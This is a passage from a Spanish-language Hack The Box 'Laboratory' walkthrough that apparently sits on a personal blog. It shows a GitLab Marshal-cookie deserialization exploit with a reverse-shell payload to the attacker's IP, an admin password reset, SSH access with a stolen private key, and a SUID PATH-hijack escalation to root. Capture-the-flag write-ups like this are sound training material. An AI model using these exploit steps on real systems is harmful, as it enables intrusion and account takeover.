+    oBiqY1buWZl2H03dTgyyMAaePL8R0MHZ90GxWWu38aPvfVEk24OEPbLCE4DxlVUr
+    0VyaudN5R6gsRigArHb9iCpOjF3qPW7FaKSpevoCpRLVcAwh3EILOggdGenXTP1k
+    huZSO2K3uFescY74aMcP0qHlLn6sxVFKoNotuPvq5tIvIWlgpHJIysR9bMkOpbhx
+    UR3u0Ca0Ccm0n2AK+92GBF/4Z2rZ6MgedYsQrB6Vn8sdFDyWwMYjQ8dlrow/XO22
+    z/ulFMTrMITYU5lGDnJ/eyiySKslIiqgVEgQaFt9b0U3Nt0XZeCobSH1ltgN
+    <span class="nt">-----END</span> RSA PRIVATE KEY-----
+
+
+<span class="nt">----------------------------------------</span>
+
+<span class="o">[&gt;]</span> Absolute Path to File : 
+</code></pre></div></div>
+
+<p>Despúes nos indica que debemos tener una instancia de gitlab en nuestra máquina, así que vamos a crearla. Primero instalamos lo que necesitamos con <code class="language-plaintext highlighter-rouge">sudo apt install docker.io</code> y <code class="language-plaintext highlighter-rouge">sudo apt-get install -y curl openssh-server ca-certificates perl</code>, despúes agregamos nuestro usuario en el grupo <strong>docker</strong> con <code class="language-plaintext highlighter-rouge">sudo usermod -a -G docker k4miyo</code>. Ahora necesitamos la imagen de gitlab, lo cual la obtendremos y corremos con <code class="language-plaintext highlighter-rouge">docker run gitlab/gitlab-ce:12.8.1-ce.0</code> (<strong>Nota</strong>: El proceso puede tardar un rato).</p>
+
+<p>Después de un rato a que se instale y ejecute todo lo que se necesita, ejecutaremos <code class="language-plaintext highlighter-rouge">docker ps</code> para obtener el nombre del contenedor y luego <code class="language-plaintext highlighter-rouge">docker exec</code> para obtener un shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ docker ps
+CONTAINER ID   IMAGE                          COMMAND             CREATED         STATUS                   PORTS                     NAMES
+dcee149e3692   gitlab/gitlab-ce:12.8.1-ce.0   <span class="s2">"/assets/wrapper"</span>   2 minutes ago   Up 2 minutes <span class="o">(</span>healthy<span class="o">)</span>   22/tcp, 80/tcp, 443/tcp   suspicious_yonath
+❯ docker <span class="nb">exec</span> <span class="nt">-it</span> suspicious_yonath bash
+root@dcee149e3692:/#
+</code></pre></div></div>
+
+<p>De acuerdo con el autor, tenemos que cambiar el valor de la variable  <code class="language-plaintext highlighter-rouge">secret_key_base</code>, entonces lo hacemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@dcee149e3692:/# <span class="nb">head</span> <span class="nt">-n</span> 10 /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
+<span class="c"># This file is managed by gitlab-ctl. Manual changes will be</span>
+<span class="c"># erased! To change the contents below, edit /etc/gitlab/gitlab.rb</span>
+<span class="c"># and run `sudo gitlab-ctl reconfigure`.</span>
+
+<span class="nt">---</span>
+production:
+  db_key_base: 011b6fc5563759488d4d1651352dd288e858d0ebbb296c04aa4cad59405a4ed3ed416ae1bad4f901e2de36ba9c155539ec415c6d74305c3e23da323a55a625a3
+  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
+  otp_key_base: ef967c004549aabb56054734d2da24eb605eea1d02f7c9757a9dea77cafd289d96deddad327ffd084a78cc98c4f0171b5477fae7f113a3c30d62f6bd8767d85a
+root@dcee149e3692:/#
+</code></pre></div></div>
+
+<p>Aplicamos una reconfiguración con  <code class="language-plaintext highlighter-rouge">gitlab-ctl restart</code> y ahora debemos ejecutar <code class="language-plaintext highlighter-rouge">gitlab-rails console</code> para obtener una consola y ejecutar lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@dcee149e3692:/# gitlab-rails console
+<span class="nt">--------------------------------------------------------------------------------</span>
+ GitLab:       12.8.1 <span class="o">(</span>d18b43a5f5a<span class="o">)</span> FOSS
+ GitLab Shell: 11.0.0
+ PostgreSQL:   10.12
+<span class="nt">--------------------------------------------------------------------------------</span>
+Loading production environment <span class="o">(</span>Rails 6.0.2<span class="o">)</span>
+irb<span class="o">(</span>main<span class="o">)</span>:001:0&gt; request <span class="o">=</span> ActionDispatch::Request.new<span class="o">(</span>Rails.application.env_config<span class="o">)</span> irb<span class="o">(</span>main<span class="o">)</span>:001:0&gt; request.env[<span class="s2">"action_dispatch.cookies_serializer"</span><span class="o">]</span> <span class="o">=</span> :marshal irb<span class="o">(</span>main<span class="o">)</span>:001:0&gt; cookies <span class="o">=</span> request.cookie_jar 
+</code></pre></div></div>
+
+<p>Nos puede salir muchas lineas al ejecutar los comandos, es normal y es propia de ejcutar dichos comandos. Ahora, de acuerdo con el usuario, nos indica ejecutar <code class="language-plaintext highlighter-rouge">erb = ERB.new("&lt;%= 'echo vakzz was here &gt; /tmp/vakzz' %&gt;")</code>; nosotros lo cambiaremos para obtener una reverse shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>irb<span class="o">(</span>main<span class="o">)</span>:001:0&gt; erb <span class="o">=</span> ERB.new<span class="o">(</span><span class="s2">"&lt;%= </span><span class="sb">`</span>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.27/443 0&gt;&amp;1'</span><span class="sb">`</span><span class="s2"> %&gt;"</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>Y por último, ejecutamos los siguientes comandos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>irb<span class="o">(</span>main<span class="o">)</span>:001:0&gt; depr <span class="o">=</span> ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new<span class="o">(</span>erb, :result, <span class="s2">"@result"</span>, ActiveSupport::Deprecation.new<span class="o">)</span> 
+irb<span class="o">(</span>main<span class="o">)</span>:001:0&gt; cookies.signed[:cookie] <span class="o">=</span> depr puts 
+irb<span class="o">(</span>main<span class="o">)</span>:008:0&gt; puts cookies[:cookie]
+<span class="nv">BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI3LzQ0MyAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ</span><span class="o">=</span><span class="nt">--eb4fb167aa8fa2da52b6edf10473d0a9e8baa71d</span>
+<span class="o">=&gt;</span> nil
+irb<span class="o">(</span>main<span class="o">)</span>:009:0&gt;
+</code></pre></div></div>
+
+<p>Obtenemos una cookie, la cual debemos mandar al servidor; pero antes, nos ponemos en escucha por el puerto 443:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-vvv</span> <span class="s1">'https://git.laboratory.htb/users/sign_in'</span> <span class="nt">-b</span> <span class="s2">"experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo
+6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9
+ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI3LzQ0MyAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZ
+W5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--b07f80bd22c0771d604978b4577f643e0891f603"</span> <span class="nt">-k</span>     <span class="k">*</span>   Trying 10.10.10.216:443...                                                                                                   <span class="k">*</span> Connected to git.laboratory.htb <span class="o">(</span>10.10.10.216<span class="o">)</span> port 443 <span class="o">(</span><span class="c">#0)                                                                   * ALPN, offering h2                                                                                                              </span>
+<span class="k">*</span> ALPN, offering http/1.1                                       
+<span class="k">*</span> successfully <span class="nb">set </span>certificate verify locations:                                                                                 
+<span class="k">*</span>  CAfile: /etc/ssl/certs/ca-certificates.crt                                                                                    
+<span class="k">*</span>  CApath: /etc/ssl/certs                                                                                                        
+<span class="k">*</span> TLSv1.3 <span class="o">(</span>OUT<span class="o">)</span>, TLS handshake, Client hello <span class="o">(</span>1<span class="o">)</span>:                                                                                
+<span class="k">*</span> TLSv1.3 <span class="o">(</span>IN<span class="o">)</span>, TLS handshake, Server hello <span class="o">(</span>2<span class="o">)</span>:
+<span class="k">*</span> TLSv1.3 <span class="o">(</span>IN<span class="o">)</span>, TLS handshake, Encrypted Extensions <span class="o">(</span>8<span class="o">)</span>:
+<span class="k">*</span> TLSv1.3 <span class="o">(</span>IN<span class="o">)</span>, TLS handshake, Certificate <span class="o">(</span>11<span class="o">)</span>:
+<span class="k">*</span> TLSv1.3 <span class="o">(</span>IN<span class="o">)</span>, TLS handshake, CERT verify <span class="o">(</span>15<span class="o">)</span>:
+<span class="k">*</span> TLSv1.3 <span class="o">(</span>IN<span class="o">)</span>, TLS handshake, Finished <span class="o">(</span>20<span class="o">)</span>:
+<span class="k">*</span> TLSv1.3 <span class="o">(</span>OUT<span class="o">)</span>, TLS change cipher, Change cipher spec <span class="o">(</span>1<span class="o">)</span>:
+<span class="k">*</span> TLSv1.3 <span class="o">(</span>OUT<span class="o">)</span>, TLS handshake, Finished <span class="o">(</span>20<span class="o">)</span>:
+<span class="k">*</span> SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
+<span class="k">*</span> ALPN, server accepted to use http/1.1
+<span class="k">*</span> Server certificate:
+<span class="k">*</span>  subject: <span class="nv">CN</span><span class="o">=</span>laboratory.htb
+<span class="k">*</span>  start <span class="nb">date</span>: Jul  5 10:39:28 2020 GMT
+<span class="k">*</span>  expire <span class="nb">date</span>: Mar  3 10:39:28 2024 GMT
+<span class="k">*</span>  issuer: <span class="nv">CN</span><span class="o">=</span>laboratory.htb
+<span class="k">*</span>  SSL certificate verify result: self signed certificate <span class="o">(</span>18<span class="o">)</span>, continuing anyway.
+<span class="o">&gt;</span> GET /users/sign_in HTTP/1.1
+<span class="o">&gt;</span> Host: git.laboratory.htb
+<span class="o">&gt;</span> User-Agent: curl/7.74.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> Cookie: <span class="nv">experimentation_subject_id</span><span class="o">=</span>BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBp
+bnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pI
+D4mIC9kZXYvdGNwLzEwLjEwLjE0LjI3LzQ0MyAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvem
+VuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHB
+<span class="nv">vcnQ6OkRlcHJlY2F0aW9uAAY7ClQ</span><span class="o">=</span><span class="nt">--b07f80bd22c0771d604978b4577f643e0891f603</span>
+<span class="o">&gt;</span> 
+<span class="k">*</span> TLSv1.3 <span class="o">(</span>IN<span class="o">)</span>, TLS handshake, Newsession Ticket <span class="o">(</span>4<span class="o">)</span>:
+<span class="k">*</span> TLSv1.3 <span class="o">(</span>IN<span class="o">)</span>, TLS handshake, Newsession Ticket <span class="o">(</span>4<span class="o">)</span>:
+<span class="k">*</span> old SSL session ID is stale, removing
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.216] 35010
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>405<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+git@git:~/gitlab-rails/working<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>git
+git@git:~/gitlab-rails/working<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina víctima como el usuario <strong>git</strong>; sin embargo, vemos que nos encontramos dentro de un contenedor:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git@git:~/gitlab-rails/working<span class="nv">$ </span><span class="nb">hostname</span> <span class="nt">-I</span>
+<span class="nb">hostname</span> <span class="nt">-I</span>
+172.17.0.2 
+git@git:~/gitlab-rails/working<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Haremos un <a href="/tratamiento-tty">Tratamiento de la tty</a> para trabajar más cómodos y luego a encontrar una forma de salir del contenedor.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git@git:~<span class="nv">$ </span>gitlab-rails console
+<span class="nt">--------------------------------------------------------------------------------</span>
+ GitLab:       12.8.1 <span class="o">(</span>d18b43a5f5a<span class="o">)</span> FOSS
+ GitLab Shell: 11.0.0
+ PostgreSQL:   10.12
+<span class="nt">--------------------------------------------------------------------------------</span>
+Loading production environment <span class="o">(</span>Rails 6.0.2<span class="o">)</span>
+irb<span class="o">(</span>main<span class="o">)</span>:001:0&gt;        
+<span class="o">=&gt;</span> nil
+irb<span class="o">(</span>main<span class="o">)</span>:003:0&gt; User.active
+<span class="o">=&gt;</span> <span class="c">#&lt;ActiveRecord::Relation [#&lt;User id:4 @seven&gt;, #&lt;User id:1 @dexter&gt;, #&lt;User id:5 @k4miyo&gt;]&gt;</span>
+irb<span class="o">(</span>main<span class="o">)</span>:004:0&gt; User.admins
+<span class="o">=&gt;</span> <span class="c">#&lt;ActiveRecord::Relation [#&lt;User id:1 @dexter&gt;]&gt;</span>
+irb<span class="o">(</span>main<span class="o">)</span>:005:0&gt;
+</code></pre></div></div>
+
+<p>Desde la consola de Gitlab podemos ver a los usuarios activos y los administradores; para este caso, <strong>dexter</strong> es el único usuario administrador; por lo tanto, vamos a ver si podemos cambiar su contraseña.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>irb<span class="o">(</span>main<span class="o">)</span>:008:0&gt; u <span class="o">=</span> User.find<span class="o">(</span>1<span class="o">)</span>
+<span class="o">=&gt;</span> <span class="c">#&lt;User id:1 @dexter&gt;</span>
+irb<span class="o">(</span>main<span class="o">)</span>:009:0&gt; u.password <span class="o">=</span> <span class="s1">'hola123hola'</span>
+<span class="o">=&gt;</span> <span class="s2">"hola123hola"</span>
+irb<span class="o">(</span>main<span class="o">)</span>:010:0&gt; u.password_confirmation <span class="o">=</span> <span class="s1">'hola123hola'</span>
+<span class="o">=&gt;</span> <span class="s2">"hola123hola"</span>
+irb<span class="o">(</span>main<span class="o">)</span>:011:0&gt; u.save
+Enqueued ActionMailer::DeliveryJob <span class="o">(</span>Job ID: e7825ba1-d43a-4dd9-ab3b-a62e4cc6f107<span class="o">)</span> to Sidekiq<span class="o">(</span>mailers<span class="o">)</span> with arguments: <span class="s2">"DeviseMailer"</span>, <span class="s2">"password_change"</span>, <span class="s2">"deliver_now"</span>, <span class="c">#&lt;GlobalID:0x00007f0a94aed0f8 @uri=#&lt;URI::GID gid://gitlab/User/1&gt;&gt;</span>
+<span class="o">=&gt;</span> <span class="nb">true
+</span>irb<span class="o">(</span>main<span class="o">)</span>:012:0&gt;
+</code></pre></div></div>
+
+<p>Cambiamos la contraseña del usuario administrador <strong>dexter</strong> por <strong>hola123hola</strong>; vamos a ver si podemos ingresar al Gitlab:</p>
+
+<p><img src="/assets/images/htb-laboratory/laboratory-web3.png" alt=""></p>
+
+<p>Ya ingresamos a los recursos del usuario <strong>dexter</strong>. Buscando un poco en los repositorios, nos encontramos con una <code class="language-plaintext highlighter-rouge">id_rsa</code>, por lo tanto la descargamos, le asignamos el privilegio 600 y tratamos de conectarnos a la máquina por SSH:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ vi id_rsa
+❯ <span class="nb">chmod </span>600 id_rsa
+❯ ssh <span class="nt">-i</span> id_rsa dexter@10.10.10.216
+The authenticity of host <span class="s1">'10.10.10.216 (10.10.10.216)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:XexmI3GbFIB7qyVRFDIYvKcLfMA9pcV9LeIgJO5KQaA.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.216<span class="s1">' (ECDSA) to the list of known hosts.
+dexter@laboratory:~$ whoami
+dexter
+dexter@laboratory:~$
+</span></code></pre></div></div>
+
+<p>Ya estamos en la máquina víctima como el usuario <strong>dexter</strong> y podemos visualizar la flag (user.txt). Ahora nos toca escalar privilegios, por lo tanto, vamos a enumerar un poco el sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span>
+dexter@laboratory:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>dexter: 
+dexter@laboratory:~<span class="nv">$ </span><span class="nb">cd</span> /
+dexter@laboratory:/<span class="err">$</span>
+dexter@laboratory:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> snap
+./usr/local/bin/docker-security
+./usr/bin/sudo
+./usr/bin/newgrp
+./usr/bin/su
+./usr/bin/gpasswd
+./usr/bin/fusermount
+./usr/bin/chfn
+./usr/bin/pkexec
+./usr/bin/at
+./usr/bin/umount
+./usr/bin/chsh
+./usr/bin/mount
+./usr/bin/passwd
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/lib/openssh/ssh-keysign
+dexter@laboratory:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos permisos SUID en <code class="language-plaintext highlighter-rouge">pkexec</code>; sin embargo, vamos a resolver la máquina como fue pensada. Tenemos el binario con permisos SUID <code class="language-plaintext highlighter-rouge">/usr/local/bin/docker-security</code>, si lo ejecutamos no vemos nada; por lo tanto, vamos a ejecutarlo utilizando el comando <code class="language-plaintext highlighter-rouge">ltrace</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:/<span class="nv">$ </span>/usr/local/bin/docker-security
+dexter@laboratory:/<span class="nv">$ </span>ltrace /usr/local/bin/docker-security
+setuid<span class="o">(</span>0<span class="o">)</span>                                                                      <span class="o">=</span> <span class="nt">-1</span>
+setgid<span class="o">(</span>0<span class="o">)</span>                                                                      <span class="o">=</span> <span class="nt">-1</span>
+system<span class="o">(</span><span class="s2">"chmod 700 /usr/bin/docker"</span><span class="nb">chmod</span>: changing permissions of <span class="s1">'/usr/bin/docker'</span>: Operation not permitted
+ &lt;no <span class="k">return</span> ...&gt;
+<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
+&lt;... system resumed&gt; <span class="o">)</span>                                                         <span class="o">=</span> 256
+system<span class="o">(</span><span class="s2">"chmod 660 /var/run/docker.sock"</span><span class="nb">chmod</span>: changing permissions of <span class="s1">'/var/run/docker.sock'</span>: Operation not permitted
+ &lt;no <span class="k">return</span> ...&gt;
+<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
+&lt;... system resumed&gt; <span class="o">)</span>                                                         <span class="o">=</span> 256
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+dexter@laboratory:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Aqui ya debemos ver algo interesante y es que el comando <code class="language-plaintext highlighter-rouge">chmod</code> está siendo declarado de forma relativa y como absoluta; por lo tanto podemos hacer un <strong>Path Hijacking</strong> creando un nuevo archivo bajo del directorio que queramos, siempre y cuando tengamos permisos; por ejemplo <code class="language-plaintext highlighter-rouge">/de/shm</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:/<span class="nv">$ </span><span class="nb">cd</span> /dev/shm/
+dexter@laboratory:/dev/shm<span class="nv">$ </span><span class="nb">touch chmod
+</span>dexter@laboratory:/dev/shm<span class="nv">$ </span>vi <span class="nb">chmod
+</span>dexter@laboratory:/dev/shm<span class="nv">$ </span><span class="nb">cat chmod
+</span>bash <span class="nt">-p</span>
+dexter@laboratory:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x <span class="nb">chmod
+</span>dexter@laboratory:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+<span class="nt">-rwxr-xr-x</span> 1 dexter dexter 8 Mar 22 04:17 <span class="nb">chmod
+</span>dexter@laboratory:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ahora cambiamos el valor de la variable <code class="language-plaintext highlighter-rouge">PATH</code> para que se incluya primero la ruta de nuestro archivo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:/dev/shm<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/dev/shm:<span class="nv">$PATH</span>
+dexter@laboratory:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
+dexter@laboratory:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Y ahora ejecutamos el binario del cual tenemos permisos SUID:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:/dev/shm<span class="nv">$ </span>/usr/local/bin/docker-security
+root@laboratory:/dev/shm# <span class="nb">whoami
+</span>root
+root@laboratory:/dev/shm#
+</code></pre></div></div>
+
+<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#bash" class="page__taxonomy-item" rel="tag">Bash</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#outdated-software" class="page__taxonomy-item" rel="tag">Outdated_Software</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#patch-management" class="page__taxonomy-item" rel="tag">Patch_Management</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ruby" class="page__taxonomy-item" rel="tag">Ruby</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-03-21T00:00:00-06:00">March 21, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-networked/" class="pagination--pager" title="Hack The Box Networked
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
